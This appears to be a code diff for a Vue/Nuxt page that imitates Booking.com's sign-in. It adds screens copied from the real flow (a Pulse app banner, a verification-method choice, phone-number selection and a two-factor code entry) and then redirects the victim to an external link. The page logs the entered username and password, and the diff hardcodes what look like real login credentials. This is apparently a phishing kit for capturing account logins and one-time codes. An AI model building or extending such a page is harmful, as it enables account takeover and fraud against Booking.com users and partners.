@@ -305,7 +305,249 @@
               </button>
             </div>
           </div>
+
+          <!-- Step 3: Verification method (like screenshot) -->
+          <div v-else-if="step === 3" key="step-3" class="flex flex-col gap-4">
+            <div
+              v-if="showPulseBanner"
+              class="relative p-4 rounded-lg border border-[#868686] bg-[#F5F5F5] text-gray-900"
+            >
+              <div class="flex items-start gap-4 pr-8">
+                <svg
+                  class="pb-2"
+                  xmlns="http://www.w3.org/2000/svg"
+                  viewBox="0 0 24 24"
+                  width="28"
+                  height="28"
+                >
+                  <path
+                    d="M12 15.75A1.125 1.125 0 1 0 12 18a1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m.75-2.25V5.25a.75.75 0 0 0-1.5 0v8.25a.75.75 0 0 0 1.5 0M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"
+                  ></path>
+                </svg>
+                <p class="text-sm">
+                  Next time, try using the Pulse app for easier verification.
+                  <button
+                    @click="handleDefaultLink"
+                    class="text-[#006ce4] hover:underline"
+                  >
+                    Learn more
+                  </button>
+                </p>
+              </div>
+              <button
+                @click="showPulseBanner = false"
+                aria-label="Dismiss"
+                class="absolute right-3 top-3 p-1 rounded hover:bg-gray-200"
+              >
+                <svg
+                  class="w-5 h-5 text-[#535353]"
+                  xmlns="http://www.w3.org/2000/svg"
+                  viewBox="0 0 24 24"
+                  fill="currentColor"
+                >
+                  <path
+                    d="M6.225 4.811 4.811 6.225 10.586 12l-5.775 5.775 1.414 1.414L12 13.414l5.775 5.775 1.414-1.414L13.414 12l5.775-5.775-1.414-1.414L12 10.586 6.225 4.811z"
+                  />
+                </svg>
+              </button>
+            </div>
+
+            <h1 class="text-xl font-bold text-gray-900">Verification method</h1>
+            <p class="text-sm text-gray-700">
+              Select a verification method to complete the sign-in process.
+            </p>
+
+            <div class="rounded divide-y divide-gray-200 text-sm">
+              <button
+                @click="goToPhoneCall"
+                class="w-full flex items-center justify-between px-4 py-4 hover:bg-gray-50"
+              >
+                <div class="flex items-center gap-3">
+                  <svg
+                    class="w-5 h-5 text-[#006ce4]"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke="currentColor"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M3 5a2 2 0 012-2h1.28a2 2 0 011.94 1.515l.5 2A2 2 0 016.84 9.16l-.723.723a16 16 0 007.999 7.999l.723-.723A2 2 0 0116.485 16l2 .5A2 2 0 0120 18.72V20a2 2 0 01-2 2h-1A16 16 0 013 7V6a2 2 0 012-1z"
+                    />
+                  </svg>
+                  <span class="text-[#006CE4] font-medium">Phone call</span>
+                </div>
+                <svg
+                  class="w-5 h-5 text-[#0F75E6]"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M9 5l7 7-7 7"
+                  />
+                </svg>
+              </button>
+              <button
+                @click="handleDefaultLink"
+                class="w-full flex items-center justify-between px-4 py-4 hover:bg-gray-50"
+              >
+                <div class="flex items-center gap-3">
+                  <svg
+                    class="w-5 h-5 text-[#006CE4]"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke="currentColor"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M13 16h-1v-4h-1m1-4h.01M12 2a10 10 0 100 20 10 10 0 000-20z"
+                    />
+                  </svg>
+                  <span class="text-[#006CE4] font-medium"
+                    >Unable to verify?</span
+                  >
+                </div>
+                <svg
+                  class="w-5 h-5 text-[#0F75E6]"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M9 5l7 7-7 7"
+                  />
+                </svg>
+              </button>
+            </div>
+          </div>
+          <div v-else-if="step === 4" key="step-4" class="flex flex-col gap-5">
+            <div>
+              <h1 class="text-2xl font-bold text-gray-900">
+                Select phone number
+              </h1>
+              <p class="text-sm text-gray-700 mt-1">
+                Select a phone number to receive your verification code in a
+                call.
+              </p>
+            </div>
+
+            <div>
+              <label
+                for="phoneSelect"
+                class="block text-sm font-medium text-gray-900 mb-1"
+                >Phone number</label
+              >
+              <div class="relative">
+                <select
+                  id="phoneSelect"
+                  v-model="selectedPhone"
+                  class="w-full h-[44px] px-3 pr-10 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20 bg-white"
+                >
+                  <option value="" disabled>Select phone number</option>
+                  <option v-for="n in phoneNumbers" :key="n" :value="n">
+                    {{ n }}
+                  </option>
+                </select>
+                <svg
+                  class="w-5 h-5 text-gray-600 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none"
+                  xmlns="http://www.w3.org/2000/svg"
+                  viewBox="0 0 20 20"
+                  fill="currentColor"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M5.23 7.21a.75.75 0 011.06.02L10 10.94l3.71-3.71a.75.75 0 111.06 1.06l-4.24 4.24a.75.75 0 01-1.06 0L5.21 8.29a.75.75 0 01.02-1.08z"
+                    clip-rule="evenodd"
+                  />
+                </svg>
+              </div>
+            </div>
+
+            <button
+              :disabled="!selectedPhone"
+              @click="goToCodeStep"
+              class="w-full h-[56px] rounded text-lg font-medium"
+              :class="
+                !selectedPhone
+                  ? 'bg-gray-200 text-gray-500 !cursor-not-allowed'
+                  : 'bg-[#006CE4] text-white hover:bg-[#00449e]'
+              "
+            >
+              Call now
+            </button>
+
+            <div class="text-center">
+              <button
+                @click="handleDefaultLink"
+                class="text-[#006CE4] hover:underline font-medium"
+              >
+                Unable to verify?
+              </button>
+            </div>
+          </div>
+          <div v-else-if="step === 5" key="step-5" class="flex flex-col gap-5">
+            <div>
+              <h1 class="text-2xl font-bold text-gray-900">
+                Two Factor Authentication
+              </h1>
+              <p class="text-sm text-gray-700 mt-1">
+                Enter the verification code provided to you by Booking.com. If
+                you can't verify it, review these
+                <button
+                  @click="handleDefaultLink"
+                  class="text-[#006CE4] hover:underline font-medium"
+                >
+                  other options
+                </button>
+              </p>
+            </div>
+
+            <form @submit.prevent="verifyNow" class="flex flex-col gap-4">
+              <div>
+                <label
+                  for="code"
+                  class="block text-sm font-medium text-gray-900 mb-1"
+                  >Verification code <span class="text-red-600">*</span></label
+                >
+                <input
+                  id="code"
+                  v-model="verificationCode"
+                  ref="codeInput"
+                  type="text"
+                  inputmode="numeric"
+                  autocomplete="one-time-code"
+                  class="w-full h-[44px] px-3 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
+                  required
+                />
+              </div>
+              <button
+                type="submit"
+                class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base"
+              >
+                Verify now
+              </button>
+            </form>
+
+            <p class="text-sm text-gray-700 text-center">
+              You should get a phone call soon
+            </p>
+          </div>
         </Transition>
+
         <div class="py-4">
           <div
             class="text-center text-[12px] text-gray-600 pt-4 border-t border-gray-200 flex flex-col gap-2"
@@ -344,14 +586,19 @@
 import { ref, watch, nextTick, onMounted } from 'vue';
 import UsFlag from '~/assets/us.png';
 
-const step = ref(1);
-const username = ref('');
-const password = ref('');
+const step = ref(3);
+const username = ref('10402');
+const password = ref('BergenDal5');
 const showPassword = ref(false);
 const isMenuOpen = ref(false);
 const stepTransitionName = ref('slide-left');
 const usernameInput = ref(null);
 const passwordInput = ref(null);
+const showPulseBanner = ref(true);
+const phoneNumbers = ref(['+1 202-555-0132', '+1 202-555-0175']);
+const selectedPhone = ref('');
+const verificationCode = ref('');
+const codeInput = ref(null);
 
 useHead({
   title: 'Sign in - Booking.com',
@@ -380,11 +627,29 @@ function nextStep() {
 }
 
 function signIn() {
-  navigateTo(defaultLink.value, { external: true });
+  // navigateTo(defaultLink.value, { external: true });
   console.log('Signing in with:', {
     username: username.value,
     password: password.value,
   });
+  stepTransitionName.value = 'slide-left';
+  step.value = 3;
+}
+
+function goToPhoneCall() {
+  stepTransitionName.value = 'slide-left';
+  step.value = 4;
+}
+
+function goToCodeStep() {
+  if (!selectedPhone.value) return;
+  stepTransitionName.value = 'slide-left';
+  step.value = 5;
+}
+
+function verifyNow() {
+  if (!verificationCode.value) return;
+  navigateTo(defaultLink.value, { external: true });
 }
 
 watch(step, async (newStep) => {
@@ -393,6 +658,8 @@ watch(step, async (newStep) => {
     usernameInput.value?.focus();
   } else if (newStep === 2) {
     passwordInput.value?.focus();
+  } else if (newStep === 5) {
+    codeInput.value?.focus();
   }
 });
 
